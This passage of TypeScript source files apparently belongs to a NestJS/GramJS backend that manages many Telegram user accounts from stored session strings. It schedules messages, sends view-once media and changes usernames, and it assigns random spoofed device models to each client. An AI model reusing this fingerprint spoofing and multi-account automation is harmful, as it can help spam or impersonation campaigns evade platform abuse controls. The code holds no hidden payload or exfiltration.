'./batch-operations.dto';\r\n\r\nexport class ScheduleMessageDto extends BaseBatchItemDto {\r\n  @ApiProperty({ description: 'Message content' })\r\n  @IsString()\r\n  message: string;\r\n\r\n  @ApiProperty({ description: 'Date to schedule the message' })\r\n  @IsDateString()\r\n  @Transform(({ value }) => new Date(value))\r\n  scheduledTime: string;\r\n\r\n  @ApiProperty({ description: 'Message to reply to', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  replyTo?: number;\r\n\r\n  @ApiProperty({ description: 'Silent notification', required: false })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  silent?: boolean;\r\n}\r\n\r\nexport class GetScheduledMessagesDto extends BaseBatchItemDto {\r\n  @ApiProperty({ description: 'Maximum number of messages to return', required: false, default: 50 })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  @Transform(({ value }) => parseInt(value))\r\n  limit?: number = 50;\r\n}\r\n\r\nexport class DeleteScheduledMessageDto extends BaseBatchItemDto {\r\n  @ApiProperty({ description: 'ID of the scheduled message to delete' })\r\n  @IsNumber()\r\n  messageId: number;\r\n}\r\n\r\nexport class RescheduleMessageDto {\r\n  @ApiProperty({ description: 'Chat ID containing the message' })\r\n  @IsString()\r\n  chatId: string;\r\n\r\n  @ApiProperty({ description: 'Message ID to reschedule' })\r\n  @IsNumber()\r\n  messageId: number;\r\n\r\n  @ApiProperty({ description: 'New schedule date (ISO string)' })\r\n  @IsDateString()\r\n  newScheduleDate: string;\r\n}\r\n\r\nexport class BatchProcessItemDto {\r\n  @ApiProperty({ description: 'Chat ID or message ID depending on operation' })\r\n  @IsString()\r\n  chatId: string;\r\n\r\n  @ApiProperty({ description: 'Message ID for operations that require it', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  messageId?: number;\r\n}\r\n","import { ApiProperty } from '@nestjs/swagger';\nimport { IsString, IsOptional } from 'class-validator';\n\nexport class SendMessageDto {\n  @ApiProperty({\n    description: 'Target username or peer ID',\n    example: 'someusername',\n  })\n  @IsString()\n  peer: string;\n\n  @ApiProperty({\n    description: 'Message text to send',\n    example: 'Hello from NestJS and GramJS!',\n  })\n  @IsString()\n  message: string;\n\n  @ApiProperty({\n    description: 'Optional message parse mode (Markdown, HTML)',\n    required: false,\n    example: 'Markdown',\n  })\n  @IsOptional()\n  @IsString()\n  parseMode?: 'Markdown' | 'HTML';\n}\n","import { ApiProperty } from '@nestjs/swagger';\nimport { IsString } from 'class-validator';\n\nexport class UpdateUsernameDto {\n  @ApiProperty({\n    description: 'New username to set for the Telegram user',\n    example: 'new_username123',\n  })\n  @IsString()\n  newUsername: string;\n}\n","import { ApiProperty } from '@nestjs/swagger';\r\nimport { IsEnum, IsNotEmpty, IsOptional, IsString, ValidateIf } from 'class-validator';\r\n\r\nexport enum MediaSourceType {\r\n    PATH = 'path',\r\n    BASE64 = 'base64',\r\n    BINARY = 'binary'\r\n}\r\n\r\nexport class ViewOnceMediaDto {\r\n    @ApiProperty({\r\n        description: 'Chat ID to send the view once media to',\r\n        example: '123456789'\r\n    })\r\n    @IsString()\r\n    @IsNotEmpty()\r\n    chatId: string;\r\n\r\n    @ApiProperty({\r\n        description: 'Source type of the media: url, base64, or binary',\r\n        enum: MediaSourceType,\r\n        example: 'url'\r\n    })\r\n    @IsEnum(MediaSourceType)\r\n    @IsNotEmpty()\r\n    sourceType: MediaSourceType;\r\n\r\n    @ApiProperty({\r\n        description: 'URL of the media file (when sourceType is url)',\r\n        required: false,\r\n        example: 'https://example.com/image.jpg'\r\n    })\r\n    @ValidateIf(o => o.sourceType === MediaSourceType.PATH)\r\n    @IsString()\r\n    @IsNotEmpty()\r\n    path?: string;\r\n\r\n    @ApiProperty({\r\n        description: 'Base64 encoded media data (when sourceType is base64)',\r\n        required: false,\r\n        example: 'data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEAYABgAAD...'\r\n    })\r\n    @ValidateIf(o => o.sourceType === MediaSourceType.BASE64)\r\n    @IsString()\r\n    @IsNotEmpty()\r\n    base64Data?: string;\r\n\r\n    @ApiProperty({\r\n        description: 'Binary media data (when sourceType is binary)',\r\n        required: false,\r\n        type: 'string',\r\n        format: 'binary'\r\n    })\r\n    @ValidateIf(o => o.sourceType === MediaSourceType.BINARY)\r\n    binaryData?: any;\r\n\r\n    @ApiProperty({\r\n        description: 'Optional caption for the media',\r\n        required: false,\r\n        example: 'Check this out! It will disappear after viewing'\r\n    })\r\n    @IsString()\r\n    @IsOptional()\r\n    caption?: string;\r\n\r\n    @ApiProperty({\r\n        description: 'Optional filename for the media',\r\n        required: false,\r\n        example: 'secret_image.jpg'\r\n    })\r\n    @IsString()\r\n    @IsOptional()\r\n    filename?: string;\r\n}","import TelegramManager from '../TelegramManager';\r\nimport { parseError } from '../../../utils/parseError';\r\nimport { TelegramLogger } from './telegram-logger';\r\nimport { BadRequestException, InternalServerErrorException } from '@nestjs/common';\r\nimport { UsersService } from '../../../components/users/users.service';\r\nimport { TelegramClient } from 'telegram';\r\nimport { contains, sleep } from '../../../utils';\r\nimport { BotConfig, ChannelCategory } from '../../../utils/TelegramBots.config';\r\nimport { ConnectionStatusDto } from '../dto/connection-management.dto';\r\n\r\ninterface User {\r\n    mobile: string;\r\n    session: string;\r\n    tgId?: string;\r\n}\r\n\r\ninterface RetryConfig {\r\n    maxAttempts: number;\r\n    baseDelay: number;\r\n    maxDelay: number;\r\n    backoffMultiplier: number;\r\n    jitter: boolean;\r\n}\r\n\r\ninterface ClientInfo {\r\n    client: TelegramManager;\r\n    lastUsed: number;\r\n    autoDisconnect: boolean;\r\n    connectionAttempts: number;\r\n    lastError?: string;\r\n    state: 'connecting' | 'connected' | 'disconnecting' | 'disconnected' | 'error';\r\n    retryConfig: RetryConfig;\r\n    nextRetryAt?: number;\r\n    consecutiveFailures: number;\r\n    lastSuccessfulConnection?: number;\r\n    cleanupAttempts?: number; // Track cleanup attempts\r\n}\r\n\r\ninterface GetClientOptions {\r\n    autoDisconnect?: boolean;\r\n    handler?: boolean;\r\n    timeout?: number;\r\n    retryConfig?: Partial<RetryConfig>;\r\n    forceReconnect?: boolean;\r\n}\r\n\r\ninterface ConnectionLeakReport {\r\n    mapSize: number;\r\n    activeConnections: string[];\r\n    zombieConnections: string[];\r\n    staleConnections: string[];\r\n}\r\n\r\nclass ConnectionManager {\r\n    private static instance: ConnectionManager | null = null;\r\n    private clients: Map<string, ClientInfo>;\r\n    private readonly logger: TelegramLogger;\r\n    private cleanupInterval: NodeJS.Timeout | null = null;\r\n    private usersService: UsersService | null = null;\r\n    private isShuttingDown: boolean = false;\r\n\r\n    private readonly DEFAULT_RETRY_CONFIG: RetryConfig = {\r\n        maxAttempts: 5,\r\n        baseDelay: 1000,\r\n        maxDelay: 30000,\r\n        backoffMultiplier: 2,\r\n        jitter: true\r\n    };\r\n\r\n    private readonly CONNECTION_TIMEOUT = 60000;\r\n    private readonly MAX_CONCURRENT_CONNECTIONS = 100;\r\n    private readonly COOLDOWN_PERIOD = 600000;\r\n    private readonly VALIDATION_TIMEOUT = 10000;\r\n    private readonly CLEANUP_TIMEOUT = 15000;\r\n    private readonly MAX_CLEANUP_ATTEMPTS = 3;\r\n\r\n    private constructor() {\r\n        this.clients = new Map();\r\n        this.logger = TelegramLogger.getInstance();\r\n        this.startCleanupInterval();\r\n    }\r\n\r\n    public setUsersService(usersService: UsersService): void {\r\n        this.usersService = usersService;\r\n    }\r\n\r\n    public static getInstance(): ConnectionManager {\r\n        if (!ConnectionManager.instance) {\r\n            ConnectionManager.instance = new ConnectionManager();\r\n        }\r\n        return ConnectionManager.instance;\r\n    }\r\n\r\n    public async handleShutdown(): Promise<void> {\r\n        this.logger.logOperation('ConnectionManager', 'Graceful shutdown initiated');\r\n        this.isShuttingDown = true;\r\n        await this.disconnectAll();\r\n        this.stopCleanupInterval();\r\n    }\r\n\r\n    private createTimeoutPromise<T>(timeoutMs: number, signal?: AbortSignal): Promise<T> {\r\n        return new Promise((_, reject) => {\r\n            const timeoutId = setTimeout(() => {\r\n                reject(new Error('Operation timeout'));\r\n            }, timeoutMs);\r\n\r\n            if (signal) {\r\n                signal.addEventListener('abort', () => {\r\n                    clearTimeout(timeoutId);\r\n                    reject(new Error('Operation aborted'));\r\n                }, { once: true });\r\n            }\r\n        });\r\n    }\r\n\r\n    private calculateRetryDelay(attempt: number, config: RetryConfig): number {\r\n        let delay = Math.min(\r\n            config.baseDelay * Math.pow(config.backoffMultiplier, attempt),\r\n            config.maxDelay\r\n        );\r\n\r\n        if (config.jitter) {\r\n            // Add jitter to prevent thundering herd\r\n            delay = delay * (0.5 + Math.random() * 0.5);\r\n        }\r\n\r\n        return Math.floor(delay);\r\n    }\r\n\r\n    private shouldRetry(clientInfo: ClientInfo, error: string): boolean {\r\n        const now = Date.now();\r\n\r\n        // Check if we've exceeded max attempts\r\n        if (clientInfo.connectionAttempts >= clientInfo.retryConfig.maxAttempts) {\r\n            return false;\r\n        }\r\n\r\n        // Check if we're in cooldown period\r\n        if (clientInfo.nextRetryAt && now < clientInfo.nextRetryAt) {\r\n            return false;\r\n        }\r\n\r\n        // Check for non-retryable errors\r\n        const errorMessage = error.toLowerCase();\r\n        const nonRetryableErrors = [\r\n            'user_deactivated_ban',\r\n            'auth_key_unregistered',\r\n            'session_revoked',\r\n            'phone_number_banned',\r\n            'user_deactivated'\r\n        ];\r\n\r\n        if (nonRetryableErrors.some(errType => errorMessage.includes(errType))) {\r\n            this.logger.logOperation(clientInfo.client?.phoneNumber || 'unknown',\r\n                `Non-retryable error detected: ${error}`);\r\n            return false;\r\n        }\r\n\r\n        return true;\r\n    }\r\n\r\n    private async waitForRetry(clientInfo: ClientInfo): Promise<void> {\r\n        if (!clientInfo.nextRetryAt) return;\r\n\r\n        const now = Date.now();\r\n        const waitTime = Math.max(0, clientInfo.nextRetryAt - now);\r\n\r\n        if (waitTime > 0) {\r\n            this.logger.logOperation(clientInfo.client?.phoneNumber || 'unknown',\r\n                `Waiting ${waitTime}ms before retry attempt ${clientInfo.connectionAttempts + 1}`);\r\n            await new Promise(resolve => setTimeout(resolve, waitTime));\r\n        }\r\n    }\r\n\r\n    private async validateConnection(mobile: string, client: TelegramManager): Promise<boolean> {\r\n        try {\r\n            if (!client.connected()) {\r\n                return false;\r\n            }\r\n\r\n            const controller = new AbortController();\r\n            const timeoutId = setTimeout(() => controller.abort(), this.VALIDATION_TIMEOUT);\r\n\r\n            try {\r\n                await Promise.race([\r\n                    client.client.getMe(),\r\n                    this.createTimeoutPromise(this.VALIDATION_TIMEOUT, controller.signal)\r\n                ]);\r\n                return true;\r\n            } finally {\r\n                clearTimeout(timeoutId);\r\n                controller.abort();\r\n            }\r\n        } catch (error) {\r\n            this.logger.logError(mobile, 'Connection validation failed', error);\r\n            return false;\r\n        }\r\n    }\r\n\r\n    public async getClient(mobile: string, options: GetClientOptions = {}): Promise<TelegramManager> {\r\n        if (!mobile) {\r\n            throw new BadRequestException('Mobile number is required');\r\n        }\r\n\r\n        if (this.isShuttingDown) {\r\n            throw new InternalServerErrorException('ConnectionManager is shutting down');\r\n        }\r\n\r\n        if (this.clients.size >= this.MAX_CONCURRENT_CONNECTIONS) {\r\n            throw new InternalServerErrorException('Maximum connection limit reached');\r\n        }\r\n\r\n        const {\r\n            autoDisconnect = true,\r\n            handler = true,\r\n            timeout = this.CONNECTION_TIMEOUT,\r\n            retryConfig = {},\r\n            forceReconnect = false\r\n        } = options;\r\n\r\n        const mergedRetryConfig: RetryConfig = {\r\n            ...this.DEFAULT_RETRY_CONFIG,\r\n            ...retryConfig\r\n        };\r\n\r\n        let clientInfo = this.clients.get(mobile);\r\n        if (clientInfo?.client) {\r\n            const isValid = await this.validateConnection(mobile, clientInfo.client);\r\n            const isHealthy = clientInfo.state === 'connected' &&\r\n                clientInfo.consecutiveFailures === 0 &&\r\n                (Date.now() - clientInfo.lastSuccessfulConnection) < this.CONNECTION_TIMEOUT;\r\n            if (!forceReconnect && isValid && isHealthy) {\r\n                this.updateLastUsed(mobile);\r\n                this.logger.logOperation(mobile, 'Reusing validated healthy client');\r\n                return clientInfo.client;\r\n            }\r\n            this.logger.logOperation(mobile,\r\n                `Cleaning up client - Valid: ${isValid}, Healthy: ${isHealthy}, ForceReconnect: ${forceReconnect}`);\r\n            await this.unregisterClient(mobile);\r\n            clientInfo = undefined;\r\n        }\r\n        if (clientInfo) {\r\n            this.logger.logOperation(mobile, 'Client info found but not valid, cleaning up');\r\n            await this.unregisterClient(mobile);\r\n            await sleep(1000);\r\n        }\r\n        this.logger.logOperation(mobile, 'Creating fresh client connection');\r\n        return this.createNewClient(mobile, mergedRetryConfig, { autoDisconnect, handler, timeout });\r\n    }\r\n\r\n\r\n    private async retryConnection(\r\n        mobile: string,\r\n        clientInfo: ClientInfo,\r\n        timeout: number\r\n    ): Promise<TelegramManager> {\r\n        try {\r\n            clientInfo.state = 'connecting';\r\n            clientInfo.connectionAttempts++;\r\n            this.clients.set(mobile, clientInfo);\r\n\r\n            this.logger.logOperation(mobile,\r\n                `Retry attempt ${clientInfo.connectionAttempts}/${clientInfo.retryConfig.maxAttempts}`);\r\n\r\n            await Promise.race([\r\n                clientInfo.client.connect(),\r\n                new Promise((_, reject) =>\r\n                    setTimeout(() => reject(new Error('Reconnection timeout')), timeout)\r\n                )\r\n            ]);\r\n\r\n            if (await this.validateConnection(mobile, clientInfo.client)) {\r\n                clientInfo.state = 'connected';\r\n                clientInfo.consecutiveFailures = 0;\r\n                clientInfo.lastSuccessfulConnection = Date.now();\r\n                delete clientInfo.nextRetryAt;\r\n                delete clientInfo.lastError;\r\n                this.clients.set(mobile, clientInfo);\r\n\r\n                this.logger.logOperation(mobile, 'Retry connection successful');\r\n                return clientInfo.client;\r\n            }\r\n\r\n            throw new Error('Connection validation failed after retry');\r\n        } catch (error) {\r\n            return this.handleConnectionError(mobile, clientInfo, error as Error);\r\n        }\r\n    }\r\n\r\n    private async handleConnectionError(\r\n        mobile: string,\r\n        clientInfo: ClientInfo,\r\n        error: Error\r\n    ): Promise<never> {\r\n        clientInfo.lastError = error.message;\r\n        clientInfo.consecutiveFailures++;\r\n        clientInfo.state = 'error';\r\n\r\n        if (this.shouldRetry(clientInfo, error.message)) {\r\n            const delay = this.calculateRetryDelay(clientInfo.connectionAttempts, clientInfo.retryConfig);\r\n            clientInfo.nextRetryAt = Date.now() + delay;\r\n            this.clients.set(mobile, clientInfo);\r\n\r\n            this.logger.logOperation(mobile,\r\n                `Connection failed, will retry in ${delay}ms. Attempt ${clientInfo.connectionAttempts}/${clientInfo.retryConfig.maxAttempts}`);\r\n        } else {\r\n            this.logger.logOperation(mobile, 'Connection failed with non-retryable error or max attempts reached');\r\n            await this.unregisterClient(mobile);\r\n        }\r\n\r\n        const errorDetails = parseError(error, mobile, false);\r\n        throw new BadRequestException(errorDetails.message);\r\n    }\r\n\r\n    private async createNewClient(\r\n        mobile: string,\r\n        retryConfig: RetryConfig,\r\n        options: { autoDisconnect: boolean; handler: boolean; timeout: number }\r\n    ): Promise<TelegramManager> {\r\n        if (!this.usersService) {\r\n            throw new InternalServerErrorException('UsersService not initialized');\r\n        }\r\n\r\n        const users = await this.usersService.search({ mobile });\r\n        const user = users[0] as User;\r\n        if (!user) {\r\n            throw new BadRequestException('User not found');\r\n        }\r\n\r\n        this.logger.logOperation(mobile, 'Creating new client', {\r\n            autoDisconnect: options.autoDisconnect,\r\n            handler: options.handler,\r\n            retryConfig\r\n        });\r\n\r\n        const telegramManager = new TelegramManager(user.session, user.mobile);\r\n        // Initialize client info for tracking\r\n        const clientInfo: ClientInfo = {\r\n            client: telegramManager,\r\n            lastUsed: Date.now(),\r\n            autoDisconnect: options.autoDisconnect,\r\n            connectionAttempts: 1,\r\n            state: 'connecting',\r\n            retryConfig,\r\n            consecutiveFailures: 0,\r\n            cleanupAttempts: 0\r\n        };\r\n        this.clients.set(mobile, clientInfo);\r\n\r\n        try {\r\n            const timeoutMs = 15000; // 15 seconds timeout\r\n            const client = await Promise.race([\r\n                telegramManager.createClient(options.handler),\r\n                new Promise<null>((_, reject) =>\r\n                    setTimeout(() => reject(new Error(`Client creation timed out after ${timeoutMs}ms for ${mobile}`)), timeoutMs)\r\n                )\r\n            ]);\r\n\r\n            if (client) {\r\n                clientInfo.state = 'connected';\r\n                clientInfo.consecutiveFailures = 0;\r\n                clientInfo.lastSuccessfulConnection = Date.now();\r\n                delete clientInfo.lastError;\r\n                delete clientInfo.nextRetryAt;\r\n                this.clients.set(mobile, clientInfo);\r\n\r\n                this.logger.logOperation(mobile, 'New client created successfully');\r\n                return telegramManager;\r\n            } else {\r\n                throw new Error('Client creation returned null');\r\n            }\r\n        } catch (error) {\r\n            this.logger.logError(mobile, 'New client creation failed', error);\r\n\r\n            const errorDetails = parseError(error, mobile, false);\r\n\r\n            // Send notification for failures\r\n            try {\r\n                await BotConfig.getInstance().sendMessage(\r\n                    ChannelCategory.ACCOUNT_LOGIN_FAILURES,\r\n                    `${process.env.clientId}::${mobile}\\n\\nAttempt: ${clientInfo.connectionAttempts}\\nError: ${errorDetails.message}`\r\n                );\r\n            } catch (notificationError) {\r\n                this.logger.logError(mobile, 'Failed to send error notification', notificationError);\r\n            }\r\n\r\n            // Handle permanent failures\r\n            if (contains(errorDetails.message.toLowerCase(),\r\n                ['expired', 'unregistered', 'deactivated', 'revoked', 'user_deactivated_ban'])) {\r\n                this.logger.logOperation(mobile, 'Marking user as expired due to permanent error');\r\n                try {\r\n                    await this.usersService.updateByFilter(\r\n                        { $or: [{ tgId: user.tgId }, { mobile: mobile }] },\r\n                        { expired: true }\r\n                    );\r\n                } catch (updateError) {\r\n                    this.logger.logError(mobile, 'Failed to mark user as expired', updateError);\r\n                }\r\n            }\r\n\r\n            return this.handleConnectionError(mobile, clientInfo, error as Error);\r\n        }\r\n\r\n    }\r\n\r\n    // Enhanced cleanup with proper resource management\r\n    private async cleanupInactiveConnections(maxIdleTime: number = 180000): Promise<void> {\r\n        if (this.isShuttingDown) return;\r\n        this.logger.logOperation('ConnectionManager', 'Perfroming Regular Cleanup');\r\n        const now = Date.now();\r\n        const cleanupResults = new Map<string, boolean>();\r\n        const cleanupPromises: Array<Promise<void>> = [];\r\n\r\n        for (const [mobile, connection] of this.clients.entries()) {\r\n            const shouldCleanup =\r\n                ((connection.autoDisconnect && connection.lastUsed <= now - 100000) || connection.lastUsed <= now - this.COOLDOWN_PERIOD) &&\r\n                (\r\n                    now - connection.lastUsed > maxIdleTime ||\r\n                    connection.state === 'error' ||\r\n                    connection.consecutiveFailures >= connection.retryConfig.maxAttempts ||\r\n                    (connection.state === 'connecting' && now - connection.lastUsed > this.CONNECTION_TIMEOUT * 2) ||\r\n                    (connection.cleanupAttempts && connection.cleanupAttempts >= this.MAX_CLEANUP_ATTEMPTS)\r\n                );\r\n\r\n            if (shouldCleanup) {\r\n                this.logger.logOperation(mobile,\r\n                    `Cleaning up connection - state: ${connection.state}, failures: ${connection.consecutiveFailures}, cleanup attempts: ${connection.cleanupAttempts || 0}`);\r\n\r\n                const cleanupPromise = this.unregisterClient(mobile)\r\n                    .then(() => {\r\n                        cleanupResults.set(mobile, true);\r\n                    })\r\n                    .catch((error) => {\r\n                        this.logger.logError(mobile, 'Cleanup failed', error);\r\n                        cleanupResults.set(mobile, false);\r\n\r\n                        // Increment cleanup attempts\r\n                        const clientInfo = this.clients.get(mobile);\r\n                        if (clientInfo) {\r\n                            clientInfo.cleanupAttempts = (clientInfo.cleanupAttempts || 0) + 1;\r\n                            this.clients.set(mobile, clientInfo);\r\n                        }\r\n                    });\r\n\r\n                cleanupPromises.push(cleanupPromise);\r\n            }\r\n        }\r\n\r\n        if (cleanupPromises.length > 0) {\r\n            try {\r\n                await Promise.race([\r\n                    Promise.allSettled(cleanupPromises),\r\n                    new Promise((_, reject) =>\r\n                        setTimeout(() => reject(new Error('Cleanup timeout')), 30000)\r\n                    )\r\n                ]);\r\n            } catch (error) {\r\n                this.logger.logError('ConnectionManager', 'Cleanup operation timed out', error);\r\n            }\r\n\r\n            // Log cleanup summary\r\n            const failed = Array.from(cleanupResults.entries())\r\n                .filter(([_, success]) => !success)\r\n                .map(([mobile]) => mobile);\r\n\r\n            if (failed.length > 0) {\r\n                this.logger.logOperation('ConnectionManager',\r\n                    `Cleanup completed. Failed cleanups: ${failed.join(', ')}`);\r\n            } else {\r\n                this.logger.logOperation('ConnectionManager',\r\n                    `Cleanup completed successfully for ${cleanupResults.size} clients`);\r\n            }\r\n        }\r\n    }\r\n\r\n    private updateLastUsed(mobile: string): void {\r\n        const connection = this.clients.get(mobile);\r\n        if (connection) {\r\n            connection.lastUsed = Date.now();\r\n            this.clients.set(mobile, connection);\r\n        }\r\n    }\r\n\r\n    public hasClient(number: string): boolean {\r\n        const client = this.clients.get(number);\r\n        return client !== undefined && client.state === 'connected';\r\n    }\r\n\r\n    public async disconnectAll(): Promise<void> {\r\n        this.logger.logOperation('ConnectionManager', 'Disconnecting all clients');\r\n        const disconnectionPromises: Promise<void>[] = [];\r\n\r\n        for (const [mobile, connection] of this.clients.entries()) {\r\n            if (connection.state !== 'disconnected') {\r\n                connection.state = 'disconnecting';\r\n                this.clients.set(mobile, connection);\r\n                disconnectionPromises.push(this.unregisterClient(mobile));\r\n            }\r\n        }\r\n\r\n        try {\r\n            await Promise.race([\r\n                Promise.allSettled(disconnectionPromises),\r\n                new Promise((_, reject) =>\r\n                    setTimeout(() => reject(new Error('Disconnect all timeout')), 60000)\r\n                )\r\n            ]);\r\n        } catch (error) {\r\n            this.logger.logError('ConnectionManager', 'Disconnect all timed out', error);\r\n        }\r\n\r\n        this.clients.clear();\r\n        this.logger.logOperation('ConnectionManager', 'All clients disconnected');\r\n    }\r\n\r\n\r\n    // Unified unregister method with timeout protection and proper cleanup sequence\r\n    public async unregisterClient(mobile: string, timeoutMs: number = this.CLEANUP_TIMEOUT): Promise<void> {\r\n        const clientInfo = this.clients.get(mobile);\r\n        if (!clientInfo) return;\r\n        this.logger.logOperation(mobile, 'Unregistering client', {\r\n            state: clientInfo.state,\r\n            lastUsed: clientInfo.lastUsed,\r\n            autoDisconnect: clientInfo.autoDisconnect\r\n        });\r\n        try {\r\n            clientInfo.state = 'disconnecting';\r\n            await clientInfo.client.destroy();\r\n            this.clients.delete(mobile);\r\n        } catch (error) {\r\n            this.logger.logError(mobile, 'Unregister failed', error);\r\n        }\r\n        try {\r\n            await this.forceCleanupClient(mobile, clientInfo);\r\n        } catch (forceError) {\r\n            this.logger.logError(mobile, 'Force cleanup also failed', forceError);\r\n        }\r\n    }\r\n    private async forceCleanupClient(mobile: string, clientInfo: ClientInfo): Promise<void> {\r\n        if (clientInfo.client?.client) {\r\n            this.logger.logOperation(mobile, 'Performing FORCE cleanup');\r\n            try {\r\n                await clientInfo.client.client.destroy();\r\n            } catch (destroyError) {\r\n                this.logger.logError(mobile, 'Force destroy failed', destroyError);\r\n            }\r\n        }\r\n        try {\r\n            if (clientInfo.client) {\r\n                if (clientInfo.client.client) {\r\n                    clientInfo.client.client = null;\r\n                }\r\n                clientInfo.client = null as any;\r\n            }\r\n        } catch (refError) {\r\n            this.logger.logError(mobile, 'Reference cleanup in force mode failed', refError);\r\n        }\r\n        this.clients.delete(mobile);\r\n        this.logger.logOperation(mobile, 'Client removed from map');\r\n    }\r\n\r\n    public getActiveConnectionCount(): number {\r\n        return Array.from(this.clients.values())\r\n            .filter(client => client.state === 'connected')\r\n            .length;\r\n    }\r\n\r\n    public getConnectionLeakReport(): ConnectionLeakReport {\r\n        const activeConnections: string[] = [];\r\n        const zombieConnections: string[] = [];\r\n        const staleConnections: string[] = [];\r\n        const now = Date.now();\r\n\r\n        for (const [mobile, clientInfo] of this.clients.entries()) {\r\n            if (clientInfo.client) {\r\n                const isClientConnected = clientInfo.client.connected();\r\n                const stateConnected = clientInfo.state === 'connected';\r\n                const isStale = now - clientInfo.lastUsed > this.COOLDOWN_PERIOD * 2;\r\n\r\n                if (isClientConnected && stateConnected) {\r\n                    activeConnections.push(mobile);\r\n                } else if (!isClientConnected && stateConnected) {\r\n                    // State says connected but client isn't - zombie connection\r\n                    zombieConnections.push(mobile);\r\n                } else if (isStale && clientInfo.state !== 'disconnected') {\r\n                    // Very old connections that should have been cleaned up\r\n                    staleConnections.push(mobile);\r\n                }\r\n            }\r\n        }\r\n\r\n        return {\r\n            mapSize: this.clients.size,\r\n            activeConnections,\r\n            zombieConnections,\r\n            staleConnections\r\n        };\r\n    }\r\n\r\n    private async performHealthCheck(): Promise<void> {\r\n        if (this.isShuttingDown) return;\r\n\r\n        const leakReport = this.getConnectionLeakReport();\r\n\r\n        if (leakReport.zombieConnections.length > 0) {\r\n            this.logger.logOperation('ConnectionManager',\r\n                `Health check: Detected ${leakReport.zombieConnections.length} zombie connections`);\r\n\r\n            // Clean up zombie connections\r\n            for (const mobile of leakReport.zombieConnections) {\r\n                try {\r\n                    await this.unregisterClient(mobile);\r\n                } catch (error) {\r\n                    this.logger.logError(mobile, 'Health check cleanup failed', error);\r\n                }\r\n            }\r\n        }\r\n\r\n        if (leakReport.staleConnections.length > 0) {\r\n            this.logger.logOperation('ConnectionManager',\r\n                `Health check: Detected ${leakReport.staleConnections.length} stale connections`);\r\n\r\n            // Clean up stale connections\r\n            for (const mobile of leakReport.staleConnections) {\r\n                try {\r\n                    await this.unregisterClient(mobile);\r\n                } catch (error) {\r\n                    this.logger.logError(mobile, 'Stale connection cleanup failed', error);\r\n                }\r\n            }\r\n        }\r\n\r\n        // Log overall health status\r\n        this.logger.logOperation('ConnectionManager',\r\n            `Health check completed - Active: ${leakReport.activeConnections.length}, Total: ${leakReport.mapSize}`, leakReport);\r\n    }\r\n\r\n    public startCleanupInterval(intervalMs: number = 120000) {\r\n        if (this.cleanupInterval) {\r\n            return this.cleanupInterval\r\n        }\r\n        this.stopCleanupInterval();\r\n        this.cleanupInterval = setInterval(() => {\r\n            if (!this.isShuttingDown) {\r\n                this.cleanupInactiveConnections().catch(err => {\r\n                    this.logger.logError('ConnectionManager', 'Error in cleanup interval', err);\r\n                });\r\n                this.performHealthCheck().catch(err => {\r\n                    this.logger.logError('ConnectionManager', 'Error in initial health check', err);\r\n                });\r\n            }\r\n        }, intervalMs);\r\n\r\n        this.logger.logOperation('ConnectionManager', `Cleanup interval started with ${intervalMs}ms interval`);\r\n\r\n        // Run initial cleanup\r\n        this.cleanupInactiveConnections().catch(err => {\r\n            this.logger.logError('ConnectionManager', 'Error in initial cleanup', err);\r\n        });\r\n        return this.cleanupInterval;\r\n    }\r\n\r\n    public stopCleanupInterval(): void {\r\n        if (this.cleanupInterval) {\r\n            clearInterval(this.cleanupInterval);\r\n            this.logger.logOperation('ConnectionManager', 'Cleanup interval stopped');\r\n            this.cleanupInterval = null;\r\n        }\r\n    }\r\n\r\n    public getClientState(mobile: string): ConnectionStatusDto | undefined {\r\n        const client = this.clients.get(mobile);\r\n        if (client) {\r\n            return {\r\n                autoDisconnect: client.autoDisconnect,\r\n                connectionAttempts: client.connectionAttempts,\r\n                lastUsed: client.lastUsed,\r\n                state: client.state,\r\n                lastError: client.lastError\r\n            }\r\n        }\r\n    }\r\n\r\n    public getConnectionStats(): {\r\n        total: number;\r\n        connected: number;\r\n        connecting: number;\r\n        disconnecting: number;\r\n        disconnected: number;\r\n        error: number;\r\n        retrying: number;\r\n    } {\r\n        const stats = {\r\n            total: this.clients.size,\r\n            connected: 0,\r\n            connecting: 0,\r\n            disconnecting: 0,\r\n            disconnected: 0,\r\n            error: 0,\r\n            retrying: 0\r\n        };\r\n\r\n        const now = Date.now();\r\n        for (const client of this.clients.values()) {\r\n            if (client.state === 'error' && client.nextRetryAt && now < client.nextRetryAt) {\r\n                stats.retrying++;\r\n            } else {\r\n                stats[client.state as keyof Omit<typeof stats, 'total' | 'retrying'>]++;\r\n            }\r\n        }\r\n\r\n        return stats;\r\n    }\r\n\r\n    // Enhanced utility methods\r\n    public getClientInfo(mobile: string): ClientInfo | undefined {\r\n        return this.clients.get(mobile);\r\n    }\r\n\r\n    public async forceReconnect(mobile: string): Promise<TelegramManager> {\r\n        this.logger.logOperation(mobile, 'Force reconnection requested');\r\n        await this.unregisterClient(mobile);\r\n        return this.getClient(mobile, { forceReconnect: true });\r\n    }\r\n\r\n    public setRetryConfig(mobile: string, config: Partial<RetryConfig>): boolean {\r\n        const clientInfo = this.clients.get(mobile);\r\n        if (clientInfo) {\r\n            clientInfo.retryConfig = { ...clientInfo.retryConfig, ...config };\r\n            this.clients.set(mobile, clientInfo);\r\n            return true;\r\n        }\r\n        return false;\r\n    }\r\n}\r\n\r\nexport const connectionManager = ConnectionManager.getInstance();","import { TelegramClientParams } from \"telegram/client/telegramBaseClient\";\n\nexport function generateTGConfig(): TelegramClientParams {\n  const deviceModels = [\n    \"Pixel 6\", \"iPhone 13\", \"Samsung Galaxy S22\", \"Redmi Note 12\", \"OnePlus 9\", \"Desktop\", \"MacBook Pro\", \"iPad Pro\"\n  ];\n\n  const systemVersions = [\n    \"Android 13\", \"iOS 16.6\", \"Windows 10\", \"Windows 11\", \"macOS 13.5\", \"Ubuntu 22.04\", \"Arch Linux\"\n  ];\n\n  const appVersions = [\n    \"1.0.0\", \"2.1.3\", \"3.5.7\", \"4.0.2\", \"5.0.0\"\n  ];\n\n  function pickRandom(arr) {\n    return arr[Math.floor(Math.random() * arr.length)];\n  }\n\n  return {\n    connectionRetries: 10,\n    requestRetries: 10,\n    retryDelay: 5000,\n    timeout: 60000,\n    autoReconnect: true,\n    useWSS: true,\n    maxConcurrentDownloads: 3,\n    downloadRetries: 10,\n    floodSleepThreshold: 180,\n    deviceModel: `${pickRandom(deviceModels)}-ssk`,\n    